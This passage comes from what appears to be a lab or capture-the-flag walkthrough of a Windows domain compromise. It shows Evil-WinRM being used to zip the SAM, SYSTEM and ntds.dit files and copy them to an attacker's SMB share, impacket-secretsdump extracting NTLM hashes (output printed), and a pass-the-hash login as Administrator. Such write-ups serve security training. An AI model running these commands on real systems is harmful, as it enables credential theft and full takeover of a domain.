*Evil-WinRM* PS C:\Users\liza.kazanof\Documents> Compress-Archive -path sam,system,ntds.dit -dest dump.zip

## transfer the dump zipped file to local using smb
net use z: \\10.10.14.82\share /user:user pass

## or use evil-winrm download function
download dump.zip
```
- unzip the dump and extract the hashes using `impacket-secretsdump`
```bash
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9db1404806f026092ec95ba23ead445b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:680c12d4ef693a3ae0fcd442c3b5874a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 69f0afd7f9c47bac4a83dded01eb9dea
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
<SNIP>
```
- we can get admin reverse shell using the admin hash with `evil-winrm`
```bash
evil-winrm -i 10.129.134.78 -u Administrator -H 0039318f1e8274633445bce32ad1a290
```
#### Resources

#### Lesson Learned
